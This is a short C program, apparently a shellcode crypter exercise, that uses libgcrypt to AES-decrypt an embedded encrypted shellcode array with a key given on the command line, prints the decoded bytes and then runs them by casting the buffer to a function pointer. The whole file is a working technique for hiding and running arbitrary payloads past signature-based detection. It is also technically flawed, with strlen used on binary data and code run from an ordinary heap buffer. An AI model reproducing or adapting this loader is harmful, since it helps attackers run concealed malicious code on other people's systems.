#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <gcrypt.h>

#define GCRY_CIPHER GCRY_CIPHER_AES128   // Pick the cipher here
#define GCRY_MODE GCRY_CIPHER_MODE_OFB // Pick the cipher mode here

unsigned char shellcode [] = "\xe5\xf2\x79\xc0\xf1\x82\xb3\x66\x3b\x59\x62\xd9\x2c\x17\x91\xb4\xb9\x1e\x20\x40\x55\x19\x15\x8c\x14";

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
            printf("[!] No key provided.\n");
            printf("usage: %s <KEY>\n", argv[0]);
            return 0;
    }
 
    gcry_cipher_hd_t handle;    //create handler

    size_t keyLength = gcry_cipher_get_algo_keylen(GCRY_CIPHER);   //get key length for specified cipher

    size_t shell_len = strlen(shellcode);   
    unsigned char * outBuffer = malloc(shell_len);   //reserve buffer for decoded shellcode

    const char * key = argv[1]; // get key
    
    //set up cryptographic variables
    gcry_cipher_open(&handle, GCRY_CIPHER, GCRY_MODE, 0); 

    gcry_control (GCRYCTL_DISABLE_SECMEM, 0);

    gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);
    
    //set key
    gcry_cipher_setkey(handle, key, keyLength);
    
    //decrypt using integrated function
    gcry_cipher_decrypt(handle, outBuffer, shell_len, shellcode, shell_len);

    //print decoded shellcode
    size_t index;
    printf("\nDecoded shellcode = ");
    for (index = 0; index<shell_len; index++){
        printf("\\x%02x", outBuffer[index]);
    }

    printf("\n\nExecuting shellcode!\n\n");

    int (*ret)() = (int(*)())outBuffer;
    ret();

    //close handle and release buffer memory
    gcry_cipher_close(handle);
    free(outBuffer);
    return 0;

}
